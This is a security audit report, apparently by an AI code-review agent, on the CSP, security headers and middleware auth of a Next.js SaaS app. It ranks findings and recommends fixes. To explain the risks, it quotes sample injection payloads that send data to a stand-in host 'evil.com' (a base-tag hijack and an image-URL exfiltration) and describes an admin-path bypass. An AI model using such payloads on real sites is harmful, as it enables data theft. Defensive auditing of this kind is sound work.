# Security Headers Audit: sophia-ai-factory

**Date:** 2026-02-11
**Agent:** code-reviewer-260211-1240
**Scope:** CSP, security headers, middleware auth
**Status:** Research only (no code changes)

---

## Scope

- **Files reviewed:**
  - `/Users/macbookprom1/mekong-cli/apps/sophia-ai-factory/apps/sophia-ai-factory/next.config.ts` (lines 34-73)
  - `/Users/macbookprom1/mekong-cli/apps/sophia-ai-factory/apps/sophia-ai-factory/src/middleware.ts` (153 lines)
  - `/Users/macbookprom1/mekong-cli/apps/sophia-ai-factory/apps/sophia-ai-factory/src/app/api/checkout/route.ts`
  - `/Users/macbookprom1/mekong-cli/apps/sophia-ai-factory/apps/sophia-ai-factory/src/app/api/webhooks/polar/route.ts`
  - `/Users/macbookprom1/mekong-cli/apps/sophia-ai-factory/apps/sophia-ai-factory/src/lib/telegram/telegram-rate-limit-middleware.ts`
  - `vercel.json` — does not exist
- **21 API route handlers** scanned
- **LOC reviewed:** ~400
- **Focus:** Security headers, CSP directives, auth middleware, rate limiting

---

## Overall Assessment

Security header posture is **above average** for a Next.js SaaS. HSTS, X-Frame-Options, X-Content-Type-Options, Referrer-Policy, and Permissions-Policy are all present with reasonable values. The CSP policy exists and is non-trivial (not just `default-src *`). However, `'unsafe-inline'` in `script-src` is a significant XSS risk, and several important CSP directives are missing. Middleware auth logic is sound but lacks HTTP-level rate limiting on public API routes.

---

## 1. CSP (Content-Security-Policy) Findings

**Current CSP** (`next.config.ts` line 65):

```
default-src 'self';
img-src 'self' https: data: blob:;
script-src 'self' 'unsafe-inline';
style-src 'self' 'unsafe-inline';
font-src 'self' data:;
connect-src 'self' https://*.supabase.co https://api.polar.sh https://api.heygen.com https://api.openai.com https://openrouter.ai https://api.elevenlabs.io https://api.inngest.com;
frame-src 'self' https://www.youtube.com;
worker-src 'self';
frame-ancestors 'none';
```

### Finding 1.1: `'unsafe-inline'` in `script-src`

| | |
|---|---|
| **Severity** | **CRITICAL** |
| **Current** | `script-src 'self' 'unsafe-inline'` |
| **Risk** | Allows execution of ANY inline `<script>` tags. An attacker who achieves HTML injection (stored XSS, reflected XSS) can execute arbitrary JavaScript. This effectively nullifies CSP protection against XSS — the primary purpose of CSP. |
| **Recommended** | Use nonce-based CSP. Next.js 13+ supports `nonce` via `next.config.ts` experimental `serverActions` and custom `headers()` with middleware-generated nonces. Alternatively: `script-src 'self' 'nonce-{random}'` per request. If nonce infeasible short-term, use `'strict-dynamic'` with hash-based approach. |

### Finding 1.2: Missing `base-uri` directive

| | |
|---|---|
| **Severity** | **HIGH** |
| **Current** | Not present (falls back to `default-src 'self'`, but `base-uri` is NOT governed by `default-src`) |
| **Risk** | Attacker can inject `<base href="https://evil.com">` to hijack all relative URL resolution. Combined with `'unsafe-inline'` in scripts, this becomes a reliable XSS vector. |
| **Recommended** | Add `base-uri 'self';` |

### Finding 1.3: Missing `form-action` directive

| | |
|---|---|
| **Severity** | **HIGH** |
| **Current** | Not present (`form-action` is NOT governed by `default-src`) |
| **Risk** | Allows form submissions to any origin. Attacker injecting a form can exfiltrate data (CSRF token, session data) to external domain. Particularly relevant for checkout/payment flows. |
| **Recommended** | Add `form-action 'self' https://checkout.polar.sh;` (include Polar checkout if forms redirect there) |

### Finding 1.4: Missing `object-src` directive

| | |
|---|---|
| **Severity** | **MEDIUM** |
| **Current** | Not present (falls back to `default-src 'self'`) |
| **Risk** | `default-src 'self'` does cover this, so `object-src` defaults to `'self'`. However, explicit `object-src 'none'` is best practice to prevent Flash/Java plugin attacks. Since no plugins are used, there is zero legitimate need. |
| **Recommended** | Add `object-src 'none';` |

### Finding 1.5: Overly permissive `img-src`

| | |
|---|---|
| **Severity** | **MEDIUM** |
| **Current** | `img-src 'self' https: data: blob:` |
| **Risk** | Allows images from ANY HTTPS origin. Could be used for tracking pixels, data exfiltration via image URLs (e.g., `<img src="https://evil.com/steal?data=...">`). |
| **Recommended** | Restrict to known domains: `img-src 'self' https://v5.airtableusercontent.com https://*.public.blob.vercel-storage.com data: blob:;` (matches `remotePatterns` in images config). Add other specific domains as needed. |

### Finding 1.6: `'unsafe-inline'` in `style-src`

| | |
|---|---|
| **Severity** | **LOW** |
| **Current** | `style-src 'self' 'unsafe-inline'` |
| **Risk** | Allows inline styles. Style injection risk is lower than script injection but can enable UI redressing, data exfiltration via CSS selectors (`input[value^="secret"]`), and clickjacking assistance. |
| **Recommended** | Pragmatically acceptable for CSS-in-JS frameworks (Tailwind + styled components). If Tailwind is the only styling, consider removing `'unsafe-inline'` and using nonces for any inline `<style>` tags. Low priority. |

### Finding 1.7: Missing `upgrade-insecure-requests`

| | |
|---|---|
| **Severity** | **LOW** |
| **Current** | Not present |
| **Risk** | Mixed content on HTTP subresources won't be auto-upgraded. HSTS preload mitigates this substantially, but belt-and-suspenders approach is better. |
| **Recommended** | Add `upgrade-insecure-requests;` |

### Finding 1.8: `connect-src` domain precision

| | |
|---|---|
| **Severity** | **LOW** |
| **Current** | Lists 7 external domains |
| **Risk** | Some domains (`https://openrouter.ai`, `https://api.openai.com`) are server-side only (called from API routes, not browser). Including them in CSP is harmless but creates false sense of client-side dependency. No functional issue. |
| **Note** | `https://api.d-id.com` and `https://api.airtable.com` are called server-side (`src/lib/validation/services.ts`) so correctly omitted from CSP. No client-side fetch to these domains observed. |

---

## 2. Other Security Headers

### Finding 2.1: HSTS — Excellent

| | |
|---|---|
| **Severity** | **PASS** |
| **Current** | `Strict-Transport-Security: max-age=63072000; includeSubDomains; preload` |
| **Assessment** | 2-year max-age, includeSubDomains, preload flag. Meets OWASP A+ grade. |

### Finding 2.2: X-Frame-Options — Excellent

| | |
|---|---|
| **Severity** | **PASS** |
| **Current** | `X-Frame-Options: DENY` |
| **Assessment** | Strongest setting. Combined with `frame-ancestors 'none'` in CSP for defense-in-depth. |

### Finding 2.3: X-Content-Type-Options — Excellent

| | |
|---|---|
| **Severity** | **PASS** |
| **Current** | `X-Content-Type-Options: nosniff` |
| **Assessment** | Prevents MIME type sniffing attacks. Correct. |

### Finding 2.4: X-XSS-Protection — Correct

| | |
|---|---|
| **Severity** | **PASS** |
| **Current** | `X-XSS-Protection: 0` |
| **Assessment** | Disabled as recommended for modern browsers. Legacy XSS auditors (IE) caused more problems than they solved. CSP is the proper replacement. |

### Finding 2.5: Referrer-Policy — Acceptable, could be stricter

| | |
|---|---|
| **Severity** | **LOW** |
| **Current** | `Referrer-Policy: origin-when-cross-origin` |
| **Risk** | Sends full URL (path + query) for same-origin navigations, origin-only for cross-origin. Query parameters containing tokens or user data could leak on same-origin navigations. |
| **Recommended** | `strict-origin-when-cross-origin` (adds downgrade protection — no referrer on HTTPS-to-HTTP). This is the browser default in modern Chrome/Firefox, so explicit setting is mostly documentary. |

### Finding 2.6: Permissions-Policy — Incomplete

| | |
|---|---|
| **Severity** | **MEDIUM** |
| **Current** | `Permissions-Policy: camera=(), microphone=(), geolocation=()` |
| **Risk** | Only restricts 3 browser features. Modern Permissions-Policy supports 20+ features. Missing restrictions on: `accelerometer`, `autoplay`, `encrypted-media`, `fullscreen`, `gyroscope`, `magnetometer`, `payment`, `usb`, `interest-cohort` (FLoC opt-out). |
| **Recommended** | Add at minimum: `camera=(), microphone=(), geolocation=(), accelerometer=(), gyroscope=(), magnetometer=(), usb=(), payment=(), interest-cohort=()` |

### Finding 2.7: Missing `vercel.json` — No edge-level headers

| | |
|---|---|
| **Severity** | **LOW** |
| **Current** | File does not exist |
| **Risk** | All security headers are set via `next.config.ts` `headers()` function, which works correctly on Vercel. No gap here — just noting for completeness. `vercel.json` headers would run at the edge (before Next.js), providing defense-in-depth for static assets. |
| **Recommended** | Consider adding `vercel.json` with security headers for static asset paths (`/_next/static/*`, `/favicon.ico`) as a secondary layer. Low priority. |

---

## 3. Middleware Security

### Finding 3.1: Admin Basic Auth — Functional but has locale bypass gap

| | |
|---|---|
| **Severity** | **MEDIUM** |
| **Current** | `pathname.startsWith('/admin') \|\| pathname.includes('/admin/')` (line 60) |
| **Risk** | Path `/en/admin` (locale-prefixed, no trailing slash) would NOT match `startsWith('/admin')` (starts with `/en`) and NOT match `includes('/admin/')` (no trailing slash). An unauthenticated user could potentially access `/en/admin` without auth challenge. Whether Next.js routing resolves this depends on the route structure. |
| **Recommended** | Use `pathnameWithoutLocale()` helper (already defined line 15-18) before admin check: `const cleanPath = pathnameWithoutLocale(pathname); if (cleanPath.startsWith('/admin'))`. This is already done for `/dashboard` (line 73-74) but NOT for `/admin`. |

### Finding 3.2: No HTTP rate limiting on public API routes

| | |
|---|---|
| **Severity** | **HIGH** |
| **Current** | Rate limiting exists ONLY for Telegram bot commands (`telegram-rate-limit-middleware.ts`, Redis sliding window, 10 req/min) |
| **Risk** | 21 API route handlers have ZERO rate limiting at the HTTP layer. Key exposure: `/api/checkout` (POST) — attacker could spam checkout session creation, potentially causing Polar API abuse. `/api/ingestion/trigger` — could trigger expensive backend processing. `/api/discovery/search` — could trigger external API calls (OpenRouter). |
| **Recommended** | Add middleware-level rate limiting using `@upstash/ratelimit` or similar. At minimum protect: `/api/checkout`, `/api/ingestion/*`, `/api/discovery/*`, `/api/heygen/*`. Vercel Edge Middleware supports Redis-based rate limiting. |

### Finding 3.3: Checkout route — No CSRF protection

| | |
|---|---|
| **Severity** | **MEDIUM** |
| **Current** | `/api/checkout` POST accepts JSON body with Zod validation but no CSRF token |
| **Risk** | Cross-origin POST with `Content-Type: application/json` is restricted by CORS preflight in browsers. However, simple CORS-safe content types could bypass this. Next.js API routes don't have built-in CSRF protection. SameSite cookies (Supabase default) mitigate most CSRF. Low practical risk but violates defense-in-depth. |
| **Recommended** | Consider adding `Origin` header verification in middleware for state-changing API routes. `if (request.headers.get('origin') !== expectedOrigin) return 403`. |

### Finding 3.4: Admin Basic Auth over HTTPS only

| | |
|---|---|
| **Severity** | **LOW** |
| **Current** | Basic Auth credentials sent in `Authorization` header, decoded via `atob()` |
| **Assessment** | Basic Auth transmits credentials base64-encoded (NOT encrypted). HSTS + preload ensures HTTPS-only, so credentials are TLS-protected in transit. Acceptable for admin panel behind VPN or internal use. For production internet-facing admin, consider upgrading to session-based auth or OAuth. |

### Finding 3.5: Webhook signature verification — Good

| | |
|---|---|
| **Severity** | **PASS** |
| **Current** | Polar webhook (`/api/webhooks/polar/route.ts`) uses `standardwebhooks` library with secret-based HMAC verification |
| **Assessment** | Properly validates `webhook-id`, `webhook-timestamp`, `webhook-signature` headers. Includes fallback base64 encoding attempt. Zod validation on headers. Correct implementation. |

---

## Summary Table

| # | Finding | Severity | Category |
|---|---------|----------|----------|
| 1.1 | `'unsafe-inline'` in `script-src` | **CRITICAL** | CSP |
| 1.2 | Missing `base-uri` directive | **HIGH** | CSP |
| 1.3 | Missing `form-action` directive | **HIGH** | CSP |
| 3.2 | No HTTP rate limiting on public API routes | **HIGH** | Middleware |
| 1.4 | Missing `object-src 'none'` | **MEDIUM** | CSP |
| 1.5 | Overly permissive `img-src` | **MEDIUM** | CSP |
| 2.6 | Incomplete Permissions-Policy | **MEDIUM** | Headers |
| 3.1 | Admin auth locale bypass gap | **MEDIUM** | Middleware |
| 3.3 | No CSRF protection on checkout | **MEDIUM** | Middleware |
| 1.6 | `'unsafe-inline'` in `style-src` | **LOW** | CSP |
| 1.7 | Missing `upgrade-insecure-requests` | **LOW** | CSP |
| 1.8 | Server-only domains in `connect-src` | **LOW** | CSP |
| 2.5 | `Referrer-Policy` could be stricter | **LOW** | Headers |
| 2.7 | No `vercel.json` edge headers | **LOW** | Headers |
| 3.4 | Basic Auth acceptable with HSTS | **LOW** | Middleware |

**Passing checks:** HSTS (2.1), X-Frame-Options (2.2), X-Content-Type-Options (2.3), X-XSS-Protection (2.4), Webhook verification (3.5)

---

## Recommended Actions (Priority Order)

1. **[CRITICAL]** Replace `'unsafe-inline'` in `script-src` with nonce-based CSP. Next.js App Router supports this via `next.config.ts` experimental `cspNonce` or custom middleware nonce generation.

2. **[HIGH]** Add missing CSP directives: `base-uri 'self'; form-action 'self' https://checkout.polar.sh; object-src 'none';`

3. **[HIGH]** Implement HTTP rate limiting on public API routes (`/api/checkout`, `/api/ingestion/*`, `/api/discovery/*`) using `@upstash/ratelimit` in middleware.

4. **[MEDIUM]** Fix admin auth to use `pathnameWithoutLocale()` for locale-prefixed path matching.

5. **[MEDIUM]** Expand Permissions-Policy with additional feature restrictions.

6. **[MEDIUM]** Restrict `img-src` to specific known domains instead of wildcard `https:`.

7. **[LOW]** Add `upgrade-insecure-requests` to CSP. Update Referrer-Policy to `strict-origin-when-cross-origin`.

---

## Unresolved Questions

1. Does the app use any client-side `<script>` tags that require `'unsafe-inline'`? If all scripts are bundled by Next.js, nonce-based CSP should work without breakage. Need to verify no third-party script tags are injected.

2. Is the admin panel internet-facing or restricted to internal/VPN access? This affects the severity of Basic Auth usage.

3. Are there plans to add Google Analytics, Hotjar, or other third-party tracking scripts? These would require CSP adjustments (additional `script-src` and `connect-src` entries).

4. Is Supabase Realtime (WebSocket) used anywhere? If so, `connect-src` needs `wss://*.supabase.co`.
